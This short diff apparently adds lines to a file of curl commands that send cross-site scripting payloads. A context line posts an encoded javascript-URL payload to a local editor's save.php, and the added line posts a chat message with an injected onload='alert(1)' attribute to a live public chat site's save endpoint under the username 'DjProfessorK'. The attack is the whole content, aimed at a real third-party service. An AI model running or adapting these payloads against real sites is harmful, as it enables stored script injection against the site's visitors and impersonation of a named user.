@@ -7,4 +7,5 @@ curl -X POST -d '{"php_imageLink":"%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73
 ' localhost:3000/wall/APP/editor/save.php
 
 
+curl -X POST -d 'chatmessage="<br/><a href=\"https://jetsetradio.live/media/onload="alert(1)").gif\"";&username=DjProfessorK&chatpassword=true' https://jetsetradio.live/chat/save.php
 
